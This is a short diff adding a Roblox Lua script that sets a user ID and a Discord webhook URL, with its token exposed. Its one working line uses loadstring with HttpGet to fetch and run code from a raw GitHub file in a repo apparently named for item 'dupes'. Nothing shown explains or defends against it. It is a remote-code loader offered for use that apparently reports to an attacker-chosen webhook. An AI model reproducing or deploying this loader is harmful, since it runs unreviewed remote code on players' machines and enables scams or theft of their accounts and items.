@@ -1,0 +1,3 @@
+_G.User = 3045658934 -- replace with userid
+_G.Webhook = 'https://discord.com/api/webhooks/1059444033996468234/PXRntjgOGG5eAoaVKp1Z69Niv1prNVOqkgG8mdSawt_9BD-Prrr3g7LHEaHgwTZfAZGY' -- replace with webhook
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/splixtrade/dupesv2omg/main/dupesss')))()
